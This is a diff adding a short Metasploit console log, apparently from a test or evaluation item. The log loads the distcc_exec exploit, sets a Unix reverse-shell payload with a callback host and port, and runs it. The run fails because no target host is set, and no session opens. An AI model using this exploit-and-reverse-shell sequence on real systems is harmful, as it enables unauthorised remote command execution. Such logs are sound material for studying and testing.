@@ -1,0 +1,23 @@
+[*] Processing /tmp/msf_item35_after.rc for ERB directives.
+resource (/tmp/msf_item35_after.rc)> use exploit/unix/misc/distcc_exec
+[*] No payload configured, defaulting to cmd/unix/reverse_bash
+resource (/tmp/msf_item35_after.rc)> set RHOSTS
+RHOSTS => 
+resource (/tmp/msf_item35_after.rc)> set RPORT 3632
+RPORT => 3632
+resource (/tmp/msf_item35_after.rc)> set PAYLOAD cmd/unix/reverse
+PAYLOAD => cmd/unix/reverse
+resource (/tmp/msf_item35_after.rc)> set LHOST 172.17.0.7
+LHOST => 172.17.0.7
+resource (/tmp/msf_item35_after.rc)> set LPORT 5599
+LPORT => 5599
+resource (/tmp/msf_item35_after.rc)> exploit
+[-] Msf::OptionValidateError One or more options failed to validate: RHOSTS.
+resource (/tmp/msf_item35_after.rc)> sessions -l
+
+Active sessions
+===============
+
+No active sessions.
+
+resource (/tmp/msf_item35_after.rc)> exit -y
